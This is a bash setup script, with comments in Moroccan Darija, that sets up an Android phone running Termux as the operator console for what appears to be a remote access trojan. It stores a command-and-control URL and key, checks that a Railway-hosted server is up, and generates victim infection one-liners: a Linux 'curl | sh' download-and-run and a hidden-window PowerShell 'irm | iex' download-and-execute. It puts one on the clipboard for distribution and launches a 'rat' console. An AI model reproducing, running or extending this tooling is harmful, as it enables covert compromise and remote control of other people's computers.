#!/usr/bin/env bash
# setup.sh — kolchi f commande wa7da mn Termux
set -e
command -v termux-wake-lock >/dev/null 2>&1 || { echo "khass Termux"; exit 1; }

echo "[*] packages..."
pkg update -y >/dev/null 2>&1 || true
pkg install -y python curl termux-api termux-tools tmux >/dev/null 2>&1 || true
termux-wake-lock 2>/dev/null || true
echo "[*] 3mel battery: Settings > Apps > Termux > Battery > Unrestricted"

URL="${1:-}"; KEY="${2:-}"
if [ -z "$URL" ]; then read -rp "URL dyal Railway: " URL; fi
if [ -z "$KEY" ]; then read -rp "AUTH key: " KEY; fi
URL="${URL%/}"

printf 'URL=%s\nKEY=%s\n' "$URL" "$KEY" > "$HOME/.c2"
chmod 600 "$HOME/.c2"
. "$HOME/.c2"

if curl -fsS "$URL/healthz" >/dev/null 2>&1; then
  echo "[+] serveur 7ayy"
else
  echo "[-] healthz tqte3 — chouf railway logs"; exit 1
fi

L="curl -fsSL $URL/i | sh"
W="powershell -w hidden -c \"irm $URL/i.ps1 | iex\""
LINKS=$(curl -fsS -H "X-Auth: $KEY" "$URL/link" 2>/dev/null || true)
if printf '%s' "$LINKS" | grep -q '^linux'; then
  L=$(printf '%s\n' "$LINKS" | awk '/^linux/{sub(/^linux:[[:space:]]*/,"");print;exit}')
  W=$(printf '%s\n' "$LINKS" | awk '/^windows/{sub(/^windows:[[:space:]]*/,"");print;exit}')
  echo "[+] /link khdam"
else
  echo "[!] /link ma khdamch — 3awd railway up (l'patch ma tdeployach)"
fi

printf '%s' "$L" | termux-clipboard-set 2>/dev/null || true
echo; echo "LINUX  : $L"; echo "WINDOWS: $W"; echo
echo "[+] l'lien f l'clipboard"

termux-open-url "$URL/?k=$KEY" 2>/dev/null || echo "7el b yeddek: $URL/?k=$KEY"
echo "[+] console: python3 ~/rat/console.py --url $URL --key $KEY"
